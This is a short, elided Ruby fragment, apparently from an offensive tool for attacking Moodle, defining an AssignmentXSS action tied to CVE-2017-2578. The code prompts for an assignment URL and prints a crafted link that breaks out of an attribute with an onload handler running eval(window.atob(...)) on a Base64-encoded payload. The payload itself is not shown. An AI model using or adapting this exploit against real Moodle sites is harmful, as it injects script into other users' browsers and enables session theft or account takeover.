...
module TMoodleActions
  class AssignmentXSS
    # CVE-2017-2578
    def perform(target)
      puts "Please enter an assignment URL e.g. http://localhost/mod/assign/view.php?id=2&action=view"
      ...
      puts assignment_url + "\"onload=\"eval(window.atob('" + Base64.encode(payload).delete('\n') + "'))"
    end
  end
end
